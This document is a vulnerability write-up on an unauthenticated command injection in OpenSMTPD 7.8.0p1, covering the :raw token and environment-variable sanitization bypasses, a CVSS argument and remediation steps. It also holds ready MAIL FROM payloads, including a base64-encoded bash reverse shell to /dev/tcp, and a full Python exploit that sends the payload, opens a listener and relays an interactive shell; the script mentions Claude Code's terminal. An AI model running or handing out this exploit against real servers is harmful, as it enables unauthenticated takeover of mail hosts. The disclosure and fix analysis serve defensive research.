**Vulnerability: OpenSMTPD Unauthenticated Command Injection**

**1\. Executive Vulnerability Profile**

This assessment identifies a critical security regression in OpenSMTPD that facilitates unauthenticated remote code execution (RCE). The vulnerability represents a fundamental re-emergence of the flaws addressed in CVE-2020-7247, demonstrating that current sanitization logic can be entirely circumvented through the use of documented features. In the context of a core Mail Transfer Agent (MTA), this flaw poses a catastrophic risk to infrastructure integrity, as it allows an external actor to execute arbitrary commands with the privileges of the MDA delivery user—and potentially escalate to higher privileges—without any prior authentication or victim interaction.

| Field | Details |
| :---- | :---- |
| **Vulnerability Type** | OS Command Injection (CWE-78) |
| **Affected Software** | OpenSMTPD 7.8.0p1 (Portable) |
| **Impact** | Unauthenticated Remote Code Execution (RCE) |
| **Discovery Status** | Confirmed via live exploitation |

The existence of this vulnerability within a core infrastructure component necessitates an immediate technical review of the underlying sanitization bypasses and the multi-layered shell environment that enables them.

**2\. Analysis of Primary Attack Vectors**

The OpenSMTPD security model utilizes a two-layer sanitization architecture to protect the Mail Delivery Agent (MDA) execution path. **Layer 1** utilizes an allowlist check in valid\_localpart() (util.c:417) to restrict characters at the SMTP envelope stage. **Layer 2** utilizes MAILADDR\_ESCAPE (mda\_variables.c:201-204) to replace shell metacharacters with colons during token expansion. However, current implementation flaws allow both layers to be bypassed.

**Vector 1: The :raw Modifier Bypass**

The most direct vector involves the :raw token expansion modifier. As documented in smtpd.conf(5) (lines 1107-1114), this modifier is a standard formatting option intended to preserve the original value of MDA tokens. Technically, when a token such as %{sender:raw} is expanded, the system sets a raw flag (found at mda\_variables.c:188). This flag explicitly instructs the expansion logic to skip the Layer 2 MAILADDR\_ESCAPE loop. Consequently, metacharacters that were permitted by the Layer 1 allowlist reach the shell entirely unsanitized, effectively nullifying the original fix for CVE-2020-7247.

**Vector 2: Unsanitized Environment Variables**

A secondary and more insidious vector exists via the population of MDA environment variables. In mda\_unpriv.c:62-78, variables including $SENDER, $LOCAL, $RECIPIENT, $DOMAIN, $EXTENSION, and $ORIGINAL\_RECIPIENT are populated directly from raw envelope data without any sanitization. Because these variables are documented features (found in smtpd.conf(5) lines 1134-1174) frequently referenced in MDA command templates, they provide an injection path that persists even if the :raw modifier is not explicitly used.

**Sanitization Gap Analysis**

The following table details the characters permitted by the MAILADDR\_ALLOWED allowlist in util.c:417 and their specific functional utility in constructing a shell-based exploit when Layer 2 is bypassed:

| Character | Specific Functional Role in Exploit Construction |
| :---- | :---- |
| \` | **Command substitution:** Acts as the primary delimiter for payload execution. |
| $ | **Parameter expansion:** Enables the use of ${IFS} to bypass whitespace filters. |
| { } | **Parameter expansion:** Required syntax for complex variable substitution. |
| | | **Piping:** Facilitates chaining commands, such as decoding Base64 strings. |
| / | **Path separator:** Necessary for specifying directories or /dev/tcp/ sockets. |

The intersection of these permitted characters and the lack of secondary sanitization creates a reliable path to the underlying shell execution environment.

**3\. Execution Mechanics: The Dual-Shell Chain**

The exploitation of OpenSMTPD is uniquely facilitated by a "double-shell" execution environment. This architecture ensures that even if a payload survives the initial expansion, it is subjected to a second round of shell interpretation.

* **Shell 1 (mda\_unpriv.c:98):** The system calls execle("/bin/sh", "/bin/sh", "-c", mda\_command, ...) to execute the MDA command. This shell handles the initial token expansion. The :raw vector is interpreted here; because the backticks are expanded directly into the command string, they are immediately executed as command substitutions by this first shell instance.

* **Shell 2 (mail.mda.c:56):** The mail.mda utility calls system(argv\[0\]) on the command string it receives. This triggers a second invocation of /bin/sh \-c. This is the primary execution point for the $SENDER vector. While Shell 1 expands the environment variable, it does not re-parse the expanded content. However, the literal backticks within that variable are passed to Shell 2, where the system() call triggers the final execution of the embedded payload.

This "double-shell" path creates a robust environment for exploitation, ensuring that malicious inputs expanded in the first stage are ultimately executed in the second.

**4\. Exploitation Methodology and Payload Construction**

An attacker can achieve RCE by establishing an unauthenticated SMTP connection and providing a specifically crafted MAIL FROM address. The exploitation methodology must account for the lack of whitespace permitted in the Layer 1 allowlist.

**Payload Construction and Whitespace Bypass**

To circumvent the whitespace restriction, the exploit utilizes the Internal Field Separator—${IFS}. A functional Proof of Concept (PoC) to verify file system write access appears as follows: MAIL FROM: \<touch${IFS}/tmp/pwned@example.com\>

**Advanced Payload: The Interactive Reverse Shell**

For complex execution, Base64 encoding is the optimal strategy because its alphabet (A-Za-z0-9+/=) is entirely contained within the MAILADDR\_ALLOWED set. This allows for payloads of arbitrary complexity. A confirmed reverse shell payload—decoding to bash \-i \>& /dev/tcp/172.17.0.1/4444 0\>&1—is constructed as:

MAIL FROM: \<echo{IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ==|base64{IFS}-d|bash@example.com\>

Upon mail delivery, this payload triggers an interactive bash session. Given that this requires no authentication and no victim interaction, the severity of this exploit exceeds standard High-severity thresholds.

**5\. CVSS v3.1 Severity Assessment & Rationalization**

While initial assessments might suggest a "High" severity, a rigorous application of the CVSS v3.1 framework demands a "Critical" designation.

**CVSS Scoring Argument**

* **Proposed Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

* **Final Score: 9.8 (Critical)**

The core of the debate centers on **Attack Complexity (AC)**. While the vulnerability requires a specific MDA configuration (the use of :raw or unsanitized environment variables), the CVSS v3.1 specification explicitly dictates that Attack Complexity should reflect **"execution-phase complexity only."** Once the target environment is configured, the exploit is fully deterministic; it does not rely on race conditions, unpredictable memory offsets, or man-in-the-middle positioning. Therefore, the complexity is Low (AC:L), necessitating the 9.8 Critical rating.

**6\. Comprehensive Remediation Framework**

Remediation must move beyond reactionary patching to address the structural flaws in OpenSMTPD's MDA execution logic through a defense-in-depth approach.

**Mandatory Technical Fixes**

1. **Unconditional Token Sanitization:** Modify mda\_variables.c:201-204 to apply MAILADDR\_ESCAPE regardless of the :raw flag. If the :raw modifier must preserve the \+ character for subaddressing functionality, the escape logic must be refined to a narrower set that still captures all shell metacharacters.

2. **Environment Variable Hardening:** Mandatory sanitization must be applied to all variables exported to the MDA in mda\_unpriv.c:62-78, specifically SENDER, LOCAL, RECIPIENT, DOMAIN, EXTENSION, and ORIGINAL\_RECIPIENT.

3. **Process Execution Reform:** Replace the system() call in mail.mda.c:56 with execvp(). This transition to direct execution eliminates the second shell invocation and effectively closes the injection vector for $SENDER and other environment variables.

4. **Allowlist Tightening:** Tighten the MAILADDR\_ALLOWED allowlist in util.c:417. Characters such as \`, $, {, }, and | serve no legitimate purpose in the local-part production of RFC 5321 and should be removed to block exploits at Layer 1\.

This exploit PoC script written in Python was demonstrated in the video:
```python
import argparse
import base64
import os
import select
import socket
import sys
import termios
import time


MAILADDR_ALLOWED = set("!#$%&'*/?^`{|}~+-=_")


def build_payload(lhost, lport):
    shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    b64 = base64.b64encode(shell_cmd.encode()).decode()
    local_part = f"`echo${{IFS}}{b64}|base64${{IFS}}-d|bash`"

    for c in local_part:
        if not (c.isalnum() or c in MAILADDR_ALLOWED or c == '.'):
            print(f"[!] Character {repr(c)} would be blocked")
            sys.exit(1)

    return f"{local_part}@evil.com", shell_cmd


def send_exploit(host, port, sender, recipient):
    """Send exploit email. Prints the full SMTP dialogue."""

    def recv(sock):
        sock.settimeout(5)
        try:
            return sock.recv(4096).decode(errors="replace").strip()
        except socket.timeout:
            return ""

    def send(sock, line):
        sock.sendall((line + "\r\n").encode())
        time.sleep(0.3)
        return recv(sock)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((host, port))
    except ConnectionRefusedError:
        print(f"[!] Connection refused on {host}:{port}")
        return False

    banner = recv(sock)
    print(f"    << {banner}")

    print(f"    >> EHLO attacker.com")
    resp = send(sock, "EHLO attacker.com")
    for line in resp.splitlines()[:3]:
        print(f"    << {line.strip()}")

    mail_from = f"MAIL FROM:<{sender}>"
    print(f"    >> MAIL FROM:<`echo${{IFS}}<b64>|base64${{IFS}}-d|bash`@evil.com>")
    resp = send(sock, mail_from)
    print(f"    << {resp}")
    if "250" not in resp:
        print(f"[!] MAIL FROM rejected")
        sock.close()
        return False

    print(f"    >> RCPT TO:<{recipient}>")
    resp = send(sock, f"RCPT TO:<{recipient}>")
    print(f"    << {resp}")
    if "250" not in resp:
        print(f"[!] RCPT TO rejected")
        sock.close()
        return False

    print(f"    >> DATA")
    resp = send(sock, "DATA")
    print(f"    << {resp}")

    body = f"Subject: test\r\nFrom: x@x\r\nTo: {recipient}\r\n\r\ntest\r\n."
    print(f"    >> [message body + .]")
    resp = send(sock, body, )
    print(f"    << {resp}")
    accepted = "250" in resp

    send(sock, "QUIT")
    sock.close()
    return accepted


def relay_shell(conn):
    """
    select() relay between stdin and socket.

    Claude Code's terminal disables icrnl/opost, so Enter sends \\r
    and \\r in output prints as ^M.  We fix the terminal flags for
    the duration of the relay, then restore on exit.
    """
    sock_fd = conn.fileno()
    stdin_fd = sys.stdin.fileno()
    stdout_fd = sys.stdout.fileno()

    # Save original terminal settings and fix them for shell use
    old_attrs = termios.tcgetattr(stdin_fd)
    new_attrs = termios.tcgetattr(stdin_fd)

    # Input flags: enable CR→NL translation
    new_attrs[0] |= termios.ICRNL

    # Output flags: enable output processing + NL→CRNL
    new_attrs[1] |= (termios.OPOST | termios.ONLCR)

    termios.tcsetattr(stdin_fd, termios.TCSANOW, new_attrs)

    try:
        while True:
            readable, _, _ = select.select([sock_fd, stdin_fd], [], [])

            if sock_fd in readable:
                data = os.read(sock_fd, 4096)
                if not data:
                    print("\n[*] Shell disconnected.")
                    return
                os.write(stdout_fd, data)

            if stdin_fd in readable:
                data = os.read(stdin_fd, 4096)
                if not data:  # Ctrl-D
                    print("\n[*] Exiting.")
                    return
                # Belt-and-suspenders: also translate in case termios didn't stick
                data = data.replace(b'\r', b'\n')
                try:
                    os.write(sock_fd, data)
                except OSError:
                    print("\n[*] Shell disconnected.")
                    return

    except KeyboardInterrupt:
        print("\n[*] Exiting.")
    finally:
        # Restore original terminal settings
        termios.tcsetattr(stdin_fd, termios.TCSANOW, old_attrs)


def main():
    parser = argparse.ArgumentParser(
        description="OpenSMTPD :raw RCE — reverse shell (Bug #17)")
    parser.add_argument("target", help="OpenSMTPD SMTP host")
    parser.add_argument("port", nargs="?", type=int, default=2525)
    parser.add_argument("--lhost", default="172.17.0.1",
                        help="Listener IP (default: 172.17.0.1)")
    parser.add_argument("--lport", type=int, default=4444,
                        help="Listener port (default: 4444)")
    parser.add_argument("--recipient", default="testuser@localhost")
    args = parser.parse_args()

    sender, shell_cmd = build_payload(args.lhost, args.lport)

    print()
    print(f"[*] Target:   {args.target}:{args.port}")
    print(f"[*] Callback: {args.lhost}:{args.lport}")
    print(f"[*] Shell:    {shell_cmd}")
    print()

    # Step 1 — bind listener (kernel queues connections even before accept)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", args.lport))
    except OSError as e:
        print(f"[!] Cannot bind port {args.lport}: {e}")
        sys.exit(1)
    server.listen(1)
    print(f"[1] Listener ready on 0.0.0.0:{args.lport}")

    # Step 2 — send exploit via SMTP (shell connects during/after this)
    print(f"[2] Sending exploit via SMTP:")
    print()
    if not send_exploit(args.target, args.port, sender, args.recipient):
        print("[!] Exploit delivery failed.")
        server.close()
        sys.exit(1)

    # Step 3 — accept the reverse shell
    print()
    print(f"[3] Waiting for reverse shell ...")
    server.settimeout(15)
    try:
        conn, addr = server.accept()
    except socket.timeout:
        print("[!] No shell received (15s timeout).")
        server.close()
        sys.exit(1)
    server.close()

    print(f"[+] Shell from {addr[0]}:{addr[1]}")
    print(f"[+] Ctrl-C to exit.")
    print()

    # Step 4 — interactive relay
    relay_shell(conn)
    conn.close()


if __name__ == "__main__":
    main()
```
